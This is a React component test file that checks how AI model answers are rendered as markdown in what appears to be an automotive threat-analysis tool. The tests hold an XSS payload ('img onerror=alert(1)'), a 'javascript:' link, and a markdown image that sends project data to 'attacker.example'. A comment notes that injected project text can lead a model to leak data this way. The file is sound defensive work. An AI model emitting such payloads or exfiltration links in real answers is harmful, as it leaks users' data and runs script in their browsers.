import { render, screen } from '@testing-library/react'
import { describe, expect, it } from 'vitest'
import { AssistantMarkdown } from './AssistantMarkdown'

describe('AssistantMarkdown', () => {
  it('renders emphasis, lists and tables from the answer', () => {
    render(<AssistantMarkdown>{'The item **Headlamp ECU** has:\n\n- low beam\n- high beam\n\n| Asset | Property |\n| --- | --- |\n| CAN bus | Integrity |'}</AssistantMarkdown>)

    expect(screen.getByText('Headlamp ECU').tagName).toBe('STRONG')
    expect(screen.getAllByRole('listitem').map((li) => li.textContent)).toEqual(['low beam', 'high beam'])
    expect(screen.getByRole('cell', { name: 'Integrity' })).toBeInTheDocument()
  })

  it('does not render raw HTML or unsafe links from the model', () => {
    const { container } = render(
      <AssistantMarkdown>{'<img src="x" onerror="alert(1)"> [click](javascript:alert(1)) [docs](https://example.org)'}</AssistantMarkdown>,
    )

    expect(container.querySelector('img')).toBeNull()
    expect(screen.getByText('click').getAttribute('href')).toBe('')
    expect(screen.getByRole('link', { name: 'docs' })).toHaveAttribute('rel', 'noopener noreferrer')
  })

  it('shows the alt text instead of loading images from the model', () => {
    // The browser requests an image URL as soon as an <img> is rendered, without a click. Text in the project can
    // make the model put project data into such a URL, so an answer must never make the browser load one.
    const { container } = render(
      <AssistantMarkdown>{'Done. ![status](https://attacker.example/pixel.png?d=Headlamp%20ECU)'}</AssistantMarkdown>,
    )

    expect(container.querySelector('img')).toBeNull()
    expect(container).toHaveTextContent('Done. status')
  })
})
